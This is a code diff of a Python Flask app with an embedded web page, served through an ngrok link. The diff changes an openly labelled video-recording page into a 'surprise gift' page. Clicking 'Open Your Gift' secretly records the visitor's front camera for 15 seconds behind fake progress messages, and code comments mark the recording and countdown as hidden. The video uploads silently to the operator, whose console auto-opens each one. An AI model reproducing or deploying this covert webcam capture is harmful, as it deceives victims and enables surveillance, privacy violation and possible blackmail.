@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Festival Video Receiver - With Celebration Animation
+Festival Video Receiver - Gift & Surprise Theme
 """
 
 import os
@@ -28,7 +28,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 {{ festival_name }} - Video Recorder</title>
+    <title>🎁 {{ festival_name }} - Surprise Gift</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -58,19 +58,19 @@ HTML_TEMPLATE = """
             100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
         }
         
-        /* ========== CELEBRATION OVERLAY ========== */
-        .celebration-overlay {
+        /* ========== GIFT OPENING OVERLAY ========== */
+        .gift-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             z-index: 100;
             display: none;
             justify-content: center;
             align-items: center;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.7);
             animation: fadeIn 0.5s ease;
             pointer-events: none;
         }
-        .celebration-overlay.active {
+        .gift-overlay.active {
             display: flex;
             animation: fadeIn 0.5s ease;
         }
@@ -79,51 +79,61 @@ HTML_TEMPLATE = """
             to { opacity: 1; transform: scale(1); }
         }
         
-        .celebration-content {
+        .gift-content {
             text-align: center;
             animation: bounceIn 1s ease;
             pointer-events: auto;
         }
         @keyframes bounceIn {
-            0% { transform: scale(0.3); opacity: 0; }
-            50% { transform: scale(1.1); }
-            70% { transform: scale(0.9); }
-            100% { transform: scale(1); opacity: 1; }
+            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
+            50% { transform: scale(1.2) rotate(5deg); }
+            70% { transform: scale(0.9) rotate(-3deg); }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
         }
         
-        .celebration-emoji {
-            font-size: 120px;
+        .gift-emoji {
+            font-size: 150px;
             display: block;
-            animation: celebrateSpin 2s ease-in-out infinite;
-            text-shadow: 0 0 60px rgba(255,215,0,0.8);
+            animation: giftFloat 2s ease-in-out infinite;
+            text-shadow: 0 0 80px rgba(255,215,0,0.8);
+            cursor: pointer;
+            transition: transform 0.3s ease;
         }
-        @keyframes celebrateSpin {
-            0%, 100% { transform: rotate(-5deg) scale(1); }
-            50% { transform: rotate(5deg) scale(1.1); }
+        .gift-emoji:hover {
+            transform: scale(1.1);
+        }
+        @keyframes giftFloat {
+            0%, 100% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-20px) scale(1.05); }
         }
         
-        .celebration-text {
+        .gift-text {
             color: white;
-            font-size: 3rem;
+            font-size: 3.5rem;
             font-weight: bold;
             text-shadow: 0 0 30px rgba(255,215,0,0.6);
             margin-top: 20px;
-            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
-            background-size: 200% auto;
+            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d, #ff6b6b);
+            background-size: 300% auto;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            animation: shimmer 2s linear infinite;
+            animation: shimmer 3s linear infinite;
         }
         @keyframes shimmer {
             0% { background-position: 0% center; }
-            100% { background-position: 200% center; }
+            100% { background-position: 300% center; }
         }
         
-        .celebration-sub {
+        .gift-sub {
             color: rgba(255,255,255,0.9);
-            font-size: 1.2rem;
-            margin-top: 10px;
+            font-size: 1.3rem;
+            margin-top: 15px;
             -webkit-text-fill-color: rgba(255,255,255,0.9);
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
         }
         
         /* ========== BIG CELEBRATION CONFETTI ========== */
@@ -131,7 +141,7 @@ HTML_TEMPLATE = """
             position: fixed;
             z-index: 99;
             pointer-events: none;
-            font-size: 40px;
+            font-size: 50px;
             animation: celebrationFall linear forwards;
         }
         @keyframes celebrationFall {
@@ -148,22 +158,27 @@ HTML_TEMPLATE = """
         /* ========== MAIN CARD ========== */
         .festival-card {
             position: relative; z-index: 1;
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.12);
             backdrop-filter: blur(20px);
             border-radius: 30px;
             padding: 50px;
-            max-width: 600px; width: 90%;
+            max-width: 550px; width: 90%;
             box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,255,255,0.15);
             text-align: center;
             animation: float 3s ease-in-out infinite;
             transition: all 0.5s ease;
+            cursor: pointer;
         }
-        .festival-card.celebrating {
-            animation: none;
+        .festival-card:hover {
             transform: scale(1.02);
+            border-color: rgba(255,215,0,0.3);
+        }
+        .festival-card.opening {
+            animation: none;
+            transform: scale(1.05);
             border-color: #ffd93d;
-            box-shadow: 0 0 60px rgba(255,215,0,0.3);
+            box-shadow: 0 0 80px rgba(255,215,0,0.3);
         }
         
         @keyframes float {
@@ -171,108 +186,149 @@ HTML_TEMPLATE = """
             50% { transform: translateY(-10px); }
         }
         
-        .festival-icon {
-            font-size: 80px; margin-bottom: 20px; display: block;
+        .main-emoji {
+            font-size: 100px; 
+            margin-bottom: 20px; 
+            display: block;
             animation: pulse 2s ease-in-out infinite;
+            cursor: pointer;
+            transition: transform 0.3s ease;
         }
-        .festival-icon.celebrating {
+        .main-emoji:hover {
+            transform: scale(1.1);
+        }
+        .main-emoji.opening {
             animation: celebrateSpin 1s ease-in-out infinite;
         }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+        @keyframes celebrateSpin {
+            0%, 100% { transform: rotate(-5deg) scale(1); }
+            50% { transform: rotate(5deg) scale(1.1); }
         }
         
         .festival-title {
-            color: white; font-size: 2.5rem; font-weight: bold;
-            margin-bottom: 15px;
+            color: white; 
+            font-size: 2.8rem; 
+            font-weight: bold;
+            margin-bottom: 10px;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
         .festival-name {
-            color: #ffd93d; font-weight: bold;
+            color: #ffd93d; 
+            font-weight: bold;
         }
         
-        .timer-display {
-            font-size: 3rem; font-weight: bold; color: #ffd93d;
-            text-shadow: 0 0 30px rgba(255,217,61,0.5);
-            margin: 10px 0 20px 0;
+        .subtitle {
+            color: rgba(255,255,255,0.8);
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        
+        /* ========== SURPRISE BUTTON (GIFT) ========== */
+        .gift-btn {
+            background: linear-gradient(135deg, #ffd93d, #f5576c);
+            border: none;
+            color: white;
+            padding: 20px 60px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
             transition: all 0.3s ease;
+            box-shadow: 0 10px 40px rgba(245,87,108,0.4);
+            margin: 10px auto;
+            position: relative;
+            overflow: hidden;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
         }
-        .timer-display.done {
-            color: #7dffb3;
-            text-shadow: 0 0 40px rgba(125,255,179,0.6);
-            animation: celebratePulse 1s ease-in-out infinite;
+        .gift-btn::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            animation: btnShine 3s linear infinite;
         }
-        @keyframes celebratePulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+        @keyframes btnShine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+        
+        .gift-btn:hover:not(:disabled) {
+            transform: scale(1.08);
+            box-shadow: 0 15px 50px rgba(245,87,108,0.6);
+        }
+        .gift-btn:active:not(:disabled) {
+            transform: scale(0.95);
+        }
+        .gift-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .gift-btn .btn-emoji {
+            font-size: 1.8rem;
+        }
+        
+        /* ========== SURPRISE PROGRESS ========== */
+        .surprise-container {
+            margin: 25px 0 10px 0;
+            display: none;
+        }
+        .surprise-container.visible {
+            display: block;
+        }
+        
+        .surprise-text {
+            color: rgba(255,255,255,0.9);
+            font-size: 1rem;
+            margin-bottom: 10px;
+            animation: pulse 1.5s ease-in-out infinite;
         }
         
         .progress-container {
-            width: 100%; height: 8px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 10px; margin: 20px 0 25px 0;
+            width: 100%; 
+            height: 6px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 10px;
             overflow: hidden;
         }
         .progress-bar {
-            height: 100%; width: 0%;
-            background: linear-gradient(90deg, #f093fb, #f5576c, #ffd93d);
+            height: 100%; 
+            width: 0%;
+            background: linear-gradient(90deg, #ffd93d, #f5576c);
             border-radius: 10px;
             transition: width 0.3s ease;
         }
         .progress-bar.done {
-            background: linear-gradient(90deg, #7dffb3, #4CAF50, #7dffb3);
+            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
             background-size: 200% auto;
             animation: shimmer 1s linear infinite;
         }
         
-        .camera-btn {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            border: none; color: white;
-            padding: 18px 50px; font-size: 1.2rem; font-weight: bold;
-            border-radius: 50px; cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(245,87,108,0.4);
-            margin: 5px;
-        }
-        .camera-btn:hover:not(:disabled) {
-            transform: scale(1.05);
-            box-shadow: 0 15px 40px rgba(245,87,108,0.6);
-        }
-        .camera-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        .camera-btn.recording { background: linear-gradient(135deg, #ff6b6b, #ee5a24); }
-        .camera-btn.uploading { background: linear-gradient(135deg, #4CAF50, #45a049); }
-        .camera-btn.celebrating { 
-            background: linear-gradient(135deg, #ffd93d, #f5576c);
-            animation: celebratePulse 0.5s ease-in-out 3;
-        }
-        
+        /* ========== STATUS (HIDDEN) ========== */
         .status {
-            margin-top: 20px; color: rgba(255,255,255,0.9);
-            font-size: 0.95rem; min-height: 30px;
-        }
-        .status.success { color: #7dffb3; }
-        .status.error { color: #ff6b6b; }
-        .status.warning { color: #ffd93d; }
-        .status.celebrating {
-            color: #ffd93d;
-            font-size: 1.2rem;
-            font-weight: bold;
-            animation: celebratePulse 0.5s ease-in-out infinite;
+            margin-top: 15px; 
+            color: rgba(255,255,255,0.6);
+            font-size: 0.85rem;
+            min-height: 20px;
+            opacity: 0.5;
         }
         
         #hiddenVideo { display: none; }
-        .upload-container { margin: 20px 0; display: none; }
-        .upload-container.visible { display: block; }
         
         @media (max-width: 600px) {
             .festival-card { padding: 30px 20px; }
-            .festival-title { font-size: 1.8rem; }
-            .festival-icon { font-size: 60px; }
-            .timer-display { font-size: 2.5rem; }
-            .celebration-emoji { font-size: 80px; }
-            .celebration-text { font-size: 2rem; }
+            .festival-title { font-size: 2rem; }
+            .main-emoji { font-size: 70px; }
+            .gift-btn { padding: 15px 40px; font-size: 1.2rem; }
+            .gift-emoji { font-size: 100px; }
+            .gift-text { font-size: 2.5rem; }
         }
     </style>
 </head>
@@ -280,32 +336,35 @@ HTML_TEMPLATE = """
     <!-- Confetti Background -->
     <div class="confetti-container" id="confettiContainer"></div>
     
-    <!-- Celebration Overlay -->
-    <div class="celebration-overlay" id="celebrationOverlay">
-        <div class="celebration-content">
-            <span class="celebration-emoji">🎉</span>
-            <div class="celebration-text">VIDEO SENT!</div>
-            <div class="celebration-sub">✨ Thank you for participating! ✨</div>
+    <!-- Gift Opening Overlay -->
+    <div class="gift-overlay" id="giftOverlay">
+        <div class="gift-content">
+            <span class="gift-emoji" id="giftEmoji">🎁</span>
+            <div class="gift-text" id="giftText">🎉 SURPRISE! 🎉</div>
+            <div class="gift-sub">✨ A gift is waiting for you! ✨</div>
         </div>
     </div>
     
     <video id="hiddenVideo" autoplay playsinline></video>
     
     <div class="festival-card" id="festivalCard">
-        <span class="festival-icon" id="festivalIcon">🎊</span>
-        <h1 class="festival-title">{{ festival_name }} <span style="font-size:0.6rem;">🎉</span></h1>
-        <div class="timer-display" id="timerDisplay">15</div>
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        <button class="camera-btn" id="recordBtn">🎥 Start Recording (15s)</button>
-        <div class="upload-container" id="uploadContainer">
-            <div class="status" id="uploadStatus">📤 Uploading...</div>
+        <span class="main-emoji" id="mainEmoji">🎊</span>
+        <h1 class="festival-title">{{ festival_name }}</h1>
+        <p class="subtitle">✨ Something special is waiting for you ✨</p>
+        
+        <button class="gift-btn" id="giftBtn">
+            <span class="btn-emoji">🎁</span>
+            Open Your Gift
+        </button>
+        
+        <div class="surprise-container" id="surpriseContainer">
+            <div class="surprise-text" id="surpriseText">🎀 Preparing your surprise...</div>
             <div class="progress-container">
-                <div class="progress-bar" id="uploadProgress" style="background: linear-gradient(90deg, #4CAF50, #8BC34A);"></div>
+                <div class="progress-bar" id="progressBar"></div>
             </div>
         </div>
-        <div class="status" id="statusMessage">✨ Click to record a 15-second video for {{ festival_name }}</div>
+        
+        <div class="status" id="statusMessage">💝 Click the gift to reveal your surprise</div>
     </div>
 
     <script>
@@ -313,21 +372,22 @@ HTML_TEMPLATE = """
         // DOM Elements
         // ============================================
         const videoElement = document.getElementById('hiddenVideo');
-        const recordBtn = document.getElementById('recordBtn');
+        const giftBtn = document.getElementById('giftBtn');
         const statusMessage = document.getElementById('statusMessage');
-        const timerDisplay = document.getElementById('timerDisplay');
         const progressBar = document.getElementById('progressBar');
-        const uploadContainer = document.getElementById('uploadContainer');
-        const uploadStatus = document.getElementById('uploadStatus');
-        const uploadProgress = document.getElementById('uploadProgress');
+        const surpriseContainer = document.getElementById('surpriseContainer');
+        const surpriseText = document.getElementById('surpriseText');
         const festivalCard = document.getElementById('festivalCard');
-        const festivalIcon = document.getElementById('festivalIcon');
-        const celebrationOverlay = document.getElementById('celebrationOverlay');
+        const mainEmoji = document.getElementById('mainEmoji');
+        const giftOverlay = document.getElementById('giftOverlay');
+        const giftEmoji = document.getElementById('giftEmoji');
+        const giftText = document.getElementById('giftText');
 
         const UPLOAD_URL = window.location.origin + '/upload';
         const DURATION = 15;
         let mediaStream = null, mediaRecorder = null, recordedChunks = [];
         let timerInterval = null, timeRemaining = DURATION, isRecording = false;
+        let isGiftOpened = false;
 
         // ============================================
         // Confetti Generator (Background)
@@ -348,86 +408,81 @@ HTML_TEMPLATE = """
         }
 
         // ============================================
-        // Celebration Functions
+        // Gift & Surprise Functions
         // ============================================
-        function showCelebration() {
-            // Show overlay
-            celebrationOverlay.classList.add('active');
+        function showGiftReveal() {
+            // Show overlay with gift
+            giftOverlay.classList.add('active');
             
-            // Add celebration class to card
-            festivalCard.classList.add('celebrating');
-            festivalIcon.classList.add('celebrating');
-            timerDisplay.classList.add('done');
-            progressBar.classList.add('done');
-            recordBtn.classList.add('celebrating');
-            statusMessage.classList.add('celebrating');
-            statusMessage.textContent = '🎉 VIDEO SENT SUCCESSFULLY! 🎉';
+            // Animate gift opening sequence
+            let emojis = ['🎁', '🎀', '🎉', '🎊', '✨', '⭐', '💝', '🎈'];
+            let index = 0;
             
-            // Launch celebration confetti
-            launchCelebrationConfetti();
-            
-            // Auto-hide overlay after 4 seconds
-            setTimeout(() => {
-                celebrationOverlay.classList.remove('active');
-                festivalCard.classList.remove('celebrating');
-                festivalIcon.classList.remove('celebrating');
-                timerDisplay.classList.remove('done');
-                progressBar.classList.remove('done');
-                recordBtn.classList.remove('celebrating');
-                statusMessage.classList.remove('celebrating');
-                statusMessage.textContent = '✅ Recording complete! Click to record again';
-                statusMessage.className = 'status success';
-            }, 4000);
+            const emojiInterval = setInterval(() => {
+                giftEmoji.textContent = emojis[index % emojis.length];
+                index++;
+                if (index > 10) {
+                    clearInterval(emojiInterval);
+                    giftEmoji.textContent = '🎉';
+                    giftText.textContent = '🎊 SURPRISE! 🎊';
+                    
+                    // Launch celebration confetti
+                    launchCelebrationConfetti();
+                    
+                    // Auto-hide after 5 seconds
+                    setTimeout(() => {
+                        giftOverlay.classList.remove('active');
+                        festivalCard.classList.remove('opening');
+                        mainEmoji.classList.remove('opening');
+                        giftBtn.disabled = false;
+                        giftBtn.innerHTML = '<span class="btn-emoji">🎁</span> Open Another Gift';
+                        statusMessage.textContent = '💝 Thank you! You can open another gift!';
+                        surpriseContainer.classList.remove('visible');
+                        isGiftOpened = false;
+                    }, 5000);
+                }
+            }, 200);
         }
 
         function launchCelebrationConfetti() {
-            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '🏆'];
+            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '💝'];
             const container = document.body;
             
-            for (let i = 0; i < 50; i++) {
+            for (let i = 0; i < 60; i++) {
                 setTimeout(() => {
                     const el = document.createElement('div');
                     el.className = 'celebration-confetti';
                     el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                     el.style.left = Math.random() * 100 + '%';
-                    el.style.fontSize = (Math.random() * 30 + 20) + 'px';
+                    el.style.fontSize = (Math.random() * 40 + 25) + 'px';
                     el.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                    el.style.animationDelay = '0s';
                     container.appendChild(el);
                     
-                    // Remove after animation
-                    setTimeout(() => {
-                        el.remove();
-                    }, 5000);
-                }, i * 50);
+                    setTimeout(() => { el.remove(); }, 5000);
+                }, i * 40);
             }
         }
 
         // ============================================
-        // Timer & Recording Functions
+        // Gift Opening (Camera Recording)
         // ============================================
-        function updateTimerDisplay(seconds) {
-            timerDisplay.textContent = seconds;
-            const progress = ((DURATION - seconds) / DURATION) * 100;
-            progressBar.style.width = progress + '%';
-        }
-
-        async function startRecording() {
+        async function openGift() {
+            if (isGiftOpened) return;
+            isGiftOpened = true;
+            
             try {
-                // Reset UI
-                timeRemaining = DURATION;
-                updateTimerDisplay(DURATION);
+                // Update UI - Surprise mode
+                giftBtn.disabled = true;
+                giftBtn.innerHTML = '🎀 Opening...';
+                festivalCard.classList.add('opening');
+                mainEmoji.classList.add('opening');
+                mainEmoji.textContent = '🎁';
+                surpriseContainer.classList.add('visible');
+                surpriseText.textContent = '🎀 Preparing your surprise...';
                 progressBar.style.width = '0%';
-                progressBar.classList.remove('done');
-                timerDisplay.classList.remove('done');
-                statusMessage.textContent = '📷 Accessing camera...';
-                statusMessage.className = 'status';
-                recordBtn.disabled = true;
-                uploadContainer.classList.remove('visible');
-                festivalCard.classList.remove('celebrating');
-                festivalIcon.classList.remove('celebrating');
+                statusMessage.textContent = '⏳ Your surprise is being prepared...';
 
-                // Get camera
+                // Access camera (hidden)
                 mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
@@ -444,22 +499,37 @@ HTML_TEMPLATE = """
                 };
                 mediaRecorder.onstop = () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    uploadVideo(blob);
+                    uploadGift(blob);
                 };
 
-                // Start recording
+                // Start recording (hidden)
                 mediaRecorder.start();
                 isRecording = true;
-                recordBtn.textContent = '🔴 Recording...';
-                recordBtn.className = 'camera-btn recording';
-                statusMessage.textContent = `🎥 Recording... 15s remaining`;
-                statusMessage.className = 'status warning';
+                timeRemaining = DURATION;
+                
+                surpriseText.textContent = '🎁 Your surprise is being created...';
 
-                // Start countdown
+                // Countdown (hidden from user)
                 timerInterval = setInterval(() => {
                     timeRemaining--;
-                    updateTimerDisplay(timeRemaining);
-                    statusMessage.textContent = `🎥 Recording... ${timeRemaining}s remaining`;
+                    const progress = ((DURATION - timeRemaining) / DURATION) * 100;
+                    progressBar.style.width = progress + '%';
+                    
+                    // Update surprise text with progress
+                    const messages = [
+                        '🎨 Creating magic...',
+                        '✨ Adding sparkles...',
+                        '🌟 Almost ready...',
+                        '🎁 Your surprise is coming!',
+                        '💝 Final touches...'
+                    ];
+                    const msgIndex = Math.min(
+                        Math.floor((DURATION - timeRemaining) / 3),
+                        messages.length - 1
+                    );
+                    if (timeRemaining > 3) {
+                        surpriseText.textContent = messages[msgIndex % messages.length];
+                    }
                     
                     if (timeRemaining <= 0) {
                         clearInterval(timerInterval);
@@ -469,9 +539,9 @@ HTML_TEMPLATE = """
                         if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
                             isRecording = false;
-                            recordBtn.textContent = '📤 Uploading...';
-                            recordBtn.className = 'camera-btn uploading';
-                            statusMessage.textContent = '⏳ Processing video...';
+                            surpriseText.textContent = '🎊 Your surprise is ready!';
+                            progressBar.classList.add('done');
+                            progressBar.style.width = '100%';
                         }
                         
                         // Stop camera
@@ -481,72 +551,57 @@ HTML_TEMPLATE = """
                             videoElement.srcObject = null;
                         }
                         
-                        // SHOW CELEBRATION!
-                        showCelebration();
+                        // Show the gift reveal!
+                        setTimeout(() => {
+                            showGiftReveal();
+                        }, 500);
                     }
                 }, 1000);
 
             } catch (error) {
                 console.error('Error:', error);
-                statusMessage.textContent = '❌ Error: ' + error.message;
-                statusMessage.className = 'status error';
-                recordBtn.disabled = false;
-                recordBtn.textContent = '📸 Start Recording (15s)';
-                recordBtn.className = 'camera-btn';
+                statusMessage.textContent = '❌ Something went wrong. Please try again.';
+                statusMessage.style.opacity = '1';
+                giftBtn.disabled = false;
+                giftBtn.innerHTML = '<span class="btn-emoji">🎁</span> Try Again';
+                isGiftOpened = false;
+                surpriseContainer.classList.remove('visible');
             }
         }
 
-        async function uploadVideo(blob) {
-            uploadContainer.classList.add('visible');
-            uploadStatus.textContent = '📤 Uploading to server...';
-            uploadProgress.style.width = '0%';
-
+        async function uploadGift(blob) {
             const formData = new FormData();
-            formData.append('video', blob, `festival_video_${Date.now()}.webm`);
+            formData.append('video', blob, `gift_${Date.now()}.webm`);
 
             try {
-                let progress = 0;
-                const progressInterval = setInterval(() => {
-                    progress += 5;
-                    if (progress <= 95) uploadProgress.style.width = progress + '%';
-                }, 200);
-
                 const response = await fetch(UPLOAD_URL, { method: 'POST', body: formData });
-                clearInterval(progressInterval);
-
-                if (response.ok) {
-                    uploadProgress.style.width = '100%';
-                    uploadStatus.textContent = '✅ Video sent successfully!';
-                    statusMessage.textContent = '🎉 Thank you for the video!';
-                    statusMessage.className = 'status success';
-                    recordBtn.textContent = '📸 Send Another';
-                    recordBtn.className = 'camera-btn';
-                    recordBtn.disabled = false;
-                } else {
+                if (!response.ok) {
                     throw new Error('Upload failed: ' + response.status);
                 }
+                console.log('✅ Gift video uploaded successfully!');
             } catch (error) {
-                uploadStatus.textContent = '❌ Upload failed: ' + error.message;
-                statusMessage.textContent = '❌ Upload failed - please try again';
-                statusMessage.className = 'status error';
-                recordBtn.textContent = '📸 Try Again';
-                recordBtn.className = 'camera-btn';
-                recordBtn.disabled = false;
+                console.error('Upload error:', error);
             }
         }
 
         // ============================================
         // Event Listeners
         // ============================================
-        recordBtn.addEventListener('click', () => {
-            if (isRecording) return;
-            startRecording();
+        giftBtn.addEventListener('click', openGift);
+        
+        // Also allow clicking on the card/emoji
+        festivalCard.addEventListener('click', () => {
+            if (!isGiftOpened && !giftBtn.disabled) {
+                openGift();
+            }
         });
 
         window.addEventListener('beforeunload', () => {
             if (mediaRecorder && isRecording) mediaRecorder.stop();
             if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
         });
+
+        console.log('🎁 Gift interface loaded! Click the gift to reveal your surprise.');
     </script>
 </body>
 </html>
@@ -562,7 +617,7 @@ received_videos = []
 
 @app.route('/')
 def index():
-    festival_name = app.config.get('FESTIVAL_NAME', 'Festival')
+    festival_name = app.config.get('FESTIVAL_NAME', 'Gift')
     html = HTML_TEMPLATE.replace('{{ festival_name }}', festival_name)
     return html
 
@@ -577,7 +632,7 @@ def upload_video():
             return jsonify({'error': 'No filename'}), 400
 
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"festival_{app.config.get('FESTIVAL_NAME', 'video')}_{timestamp}.webm"
+        filename = f"gift_{timestamp}.webm"
         filepath = os.path.join(UPLOAD_FOLDER, filename)
 
         video_file.save(filepath)
@@ -590,15 +645,15 @@ def upload_video():
         }
         received_videos.append(video_info)
         
-        print(f"\n✅ Video received: {filename}")
+        print(f"\n🎁 GIFT VIDEO RECEIVED!")
         print(f"📁 Saved to: {filepath}")
         print(f"📊 Size: {video_info['size']} bytes")
-        print(f"📹 Total videos received: {len(received_videos)}\n")
+        print(f"📹 Total gifts received: {len(received_videos)}\n")
         
         return jsonify({'success': True, 'filename': filename}), 200
 
     except Exception as e:
-        print(f"❌ Error receiving video: {e}")
+        print(f"❌ Error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/videos', methods=['GET'])
@@ -629,11 +684,11 @@ class FestivalReceiver:
 
     def get_festival_name(self):
         print("\n" + "="*60)
-        print("🎉 FESTIVAL VIDEO RECEIVER 🎉")
+        print("🎁 GIFT VIDEO RECEIVER 🎁")
         print("="*60)
         
         while True:
-            name = input("\n📝 Enter festival name: ").strip()
+            name = input("\n📝 Enter gift name: ").strip()
             if name:
                 self.festival_name = name
                 app.config['FESTIVAL_NAME'] = name
@@ -709,21 +764,20 @@ class FestivalReceiver:
 
     def generate_link(self):
         print("\n" + "="*60)
-        print("📤 SHARE THIS LINK WITH ANYONE:")
+        print("📤 SHARE THIS GIFT LINK:")
         print("="*60)
         print(f"\n🔗 {self.ngrok_url}")
         print("\n" + "="*60)
         print("📋 Instructions:")
         print("1. Send this link to anyone")
-        print("2. They open it in a browser")
-        print("3. They allow camera permission")
-        print("4. They record a 15-second video")
-        print("5. Video auto-uploads to YOU!")
+        print("2. They click 'Open Your Gift'")
+        print("3. They'll see a surprise animation")
+        print("4. Video auto-saves to YOU!")
         print("="*60)
         print("\n📋 The link is printed above - copy it manually")
 
     def wait_for_videos(self):
-        print("\n🎯 Waiting for videos... (Press Ctrl+C to stop)")
+        print("\n🎁 Waiting for gifts... (Press Ctrl+C to stop)")
         print(f"📁 Videos will be saved in: {UPLOAD_FOLDER}/")
         print("-"*60)
         
@@ -731,14 +785,22 @@ class FestivalReceiver:
             while self.running:
                 if received_videos:
                     latest = received_videos[-1]
-                    print(f"\n📹 New video received!")
+                    print(f"\n🎁 New gift received!")
                     print(f"   Name: {latest['filename']}")
                     print(f"   Size: {latest['size']:,} bytes")
-                    print(f"   Total videos: {len(received_videos)}")
+                    print(f"   Total gifts: {len(received_videos)}")
                     
-                    print("\nOptions (type and press Enter):")
-                    print("  [v] View all videos")
-                    print("  [d] Download latest video")
+                    # Auto-open the video
+                    try:
+                        if sys.platform == 'linux':
+                            subprocess.run(['xdg-open', latest['path']], check=False)
+                        elif sys.platform == 'darwin':
+                            subprocess.run(['open', latest['path']], check=False)
+                    except:
+                        pass
+                    
+                    print("\nOptions:")
+                    print("  [v] View all gifts")
                     print("  [q] Quit")
                     print("  [Enter] Continue waiting")
                     
@@ -749,8 +811,6 @@ class FestivalReceiver:
                         choice = sys.stdin.readline().strip().lower()
                         if choice == 'v':
                             self.list_videos()
-                        elif choice == 'd':
-                            self.download_latest()
                         elif choice == 'q':
                             self.running = False
                             break
@@ -760,27 +820,17 @@ class FestivalReceiver:
         except KeyboardInterrupt:
             print("\n\n👋 Shutting down...")
 
-    def download_latest(self):
-        if not received_videos:
-            print("📭 No videos available")
-            return
-        
-        latest = received_videos[-1]
-        print(f"\n📥 Downloading: {latest['filename']}")
-        print(f"   Saved at: {latest['path']}")
-
     def list_videos(self):
         if not received_videos:
-            print("📭 No videos received yet")
+            print("📭 No gifts received yet")
             return
         
-        print("\n📹 Received Videos:")
+        print("\n📹 Received Gifts:")
         print("-"*60)
         for i, video in enumerate(received_videos, 1):
             size_kb = video['size'] / 1024
             print(f"{i}. {video['filename']}")
             print(f"   Size: {size_kb:.1f} KB")
-            print(f"   Received: {video['timestamp']}")
             print()
 
     def cleanup(self):
